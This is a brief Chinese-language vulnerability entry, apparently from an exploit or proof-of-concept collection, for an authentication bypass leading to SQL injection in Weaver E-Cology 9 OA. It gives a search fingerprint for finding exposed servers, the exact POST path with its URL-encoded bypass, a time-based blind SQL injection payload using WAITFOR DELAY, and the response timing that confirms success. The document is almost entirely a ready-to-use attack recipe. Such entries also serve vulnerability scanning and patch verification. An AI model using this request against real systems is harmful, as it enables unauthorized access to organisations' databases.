# 泛微E-Cology9QRcodeBuildActionLoginSSO身份认证绕过导致SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微-[OA](https://so.csdn.net/so/search?q=OA&spm=1001.2101.3001.7020"`
- **请求**：`POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1`

**Payload**
```
modeid=127+WAITFOR+DELAY+'0%3a0%3a5'
```
- **响应特征**：200 响应时间>=5s